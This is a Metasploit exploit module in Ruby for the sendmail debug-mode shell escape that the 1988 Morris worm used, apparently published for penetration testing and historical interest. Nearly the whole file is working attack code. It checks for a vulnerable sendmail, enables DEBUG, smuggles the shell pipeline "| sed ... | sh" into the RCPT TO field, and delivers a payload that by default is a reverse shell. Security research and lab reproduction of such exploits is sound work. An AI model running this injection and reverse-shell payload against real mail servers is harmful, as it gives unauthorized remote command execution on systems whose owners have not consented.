# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require &#039;expect&#039;

class MetasploitModule < Msf::Exploit::Remote

  # cmd/unix/reverse spams the session with Telnet codes on EOF
  Rank = AverageRanking

  include Msf::Exploit::Remote::Tcp

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;Morris Worm sendmail Debug Mode Shell Escape&#039;,
      &#039;Description&#039;    => %q{
        This module exploits sendmail&#039;s well-known historical debug mode to
        escape to a shell and execute commands in the SMTP RCPT TO command.

        This vulnerability was exploited by the Morris worm in 1988-11-02.
        Cliff Stoll reports on the worm in the epilogue of The Cuckoo&#039;s Egg.

        Currently only cmd/unix/reverse and cmd/unix/generic are supported.
      },
      &#039;Author&#039;         => [
        &#039;Robert Tappan Morris&#039;, # Exploit and worm for sure
        &#039;Cliff Stoll&#039;,          # The Cuckoo&#039;s Egg inspiration
        &#039;wvu&#039;                   # Module and additional research
      ],
      &#039;References&#039;     => [
        [&#039;URL&#039;, &#039;https://en.wikipedia.org/wiki/Morris_worm&#039;],         # History
        [&#039;URL&#039;, &#039;https://spaf.cerias.purdue.edu/tech-reps/823.pdf&#039;],  # Analysis
        [&#039;URL&#039;, &#039;https://github.com/arialdomartini/morris-worm&#039;],     # Source
        [&#039;URL&#039;, &#039;http://gunkies.org/wiki/Installing_4.3_BSD_on_SIMH&#039;] # Setup
      ],
      &#039;DisclosureDate&#039; => &#039;Nov 2 1988&#039;,
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Platform&#039;       => &#039;unix&#039;,
      &#039;Arch&#039;           => ARCH_CMD,
      &#039;Privileged&#039;     => false, # DefUid in src/conf.c, usually "daemon"
      &#039;Payload&#039;        => {&#039;Compat&#039; => {&#039;RequiredCmd&#039; => &#039;generic telnet&#039;}},
      &#039;Targets&#039;        => [
        # https://en.wikipedia.org/wiki/Source_Code_Control_System
        [&#039;@(#)version.c       5.51 (Berkeley) 5/2/86&#039;, {}]
      ],
      &#039;DefaultTarget&#039;  => 0,
      &#039;DefaultOptions&#039; => {&#039;PAYLOAD&#039; => &#039;cmd/unix/reverse&#039;}
    ))

    register_options([Opt::RPORT(25)])

    register_advanced_options([
      OptFloat.new(&#039;SendExpectTimeout&#039;, [true, &#039;Timeout per send/expect&#039;, 3.5])
    ])
  end

  def check
    checkcode = CheckCode::Safe

    connect
    res = sock.get_once

    return CheckCode::Unknown unless res

    if res =~ /^220.*Sendmail/
      checkcode = CheckCode::Detected
    end

    sock.put("DEBUG\r\n")
    res = sock.get_once

    return checkcode unless res

    if res.start_with?(&#039;200 Debug set&#039;)
      checkcode = CheckCode::Appears
    end

    checkcode
  rescue Rex::ConnectionError => e
    vprint_error(e.message)
    CheckCode::Unknown
  ensure
    disconnect
  end

  def exploit
    # We don&#039;t care who the user is, so randomize it
    from = rand_text_alphanumeric(8..42)

    # Strip mail header with sed(1), pass to sh(1), and ensure a clean exit
    to = %("| sed &#039;1,/^$/d&#039; | sh; exit 0")

    # We don&#039;t have $PATH, so set one
    path = &#039;/bin:/usr/bin:/usr/ucb:/etc&#039;

    sploit = {
      nil                   => /220.*Sendmail/,
      &#039;DEBUG&#039;               => /200 Debug set/,
      "MAIL FROM:<#{from}>" => /250.*Sender ok/,
      "RCPT TO:<#{to}>"     => /250.*Recipient ok/,
      &#039;DATA&#039;                => /354 Enter mail/,
      " PATH=#{path}"       => nil,
      &#039;export PATH&#039;         => nil,
      payload.encoded       => nil,
      &#039;.&#039;                   => /250 Ok/,
      &#039;QUIT&#039;                => /221.*closing connection/
    }

    print_status(&#039;Connecting to sendmail&#039;)
    connect

    print_status(&#039;Enabling debug mode and sending exploit&#039;)
    sploit.each do |line, pattern|
      Timeout.timeout(datastore[&#039;SendExpectTimeout&#039;]) do
        if line
          print_status("Sending: #{line}")
          sock.put("#{line}\r\n")
        end
        if pattern
          vprint_status("Expecting: #{pattern.inspect}")
          sock.expect(pattern) do |pat|
            return unless pat
            vprint_good("Received: #{pat.first}")
          end
        end
      end
    end
  rescue Rex::ConnectionError => e
    fail_with(Failure::Unreachable, e.message)
  rescue Timeout::Error
    fail_with(Failure::TimeoutExpired, &#039;SendExpectTimeout maxed out&#039;)
  ensure
    disconnect
  end

  def on_new_session(session)
    print_warning("Do NOT type `exit&#039;, or else you may lose further shells!")
    print_warning(&#039;Hit ^C to abort the session instead, please and thank you&#039;)
  end

end

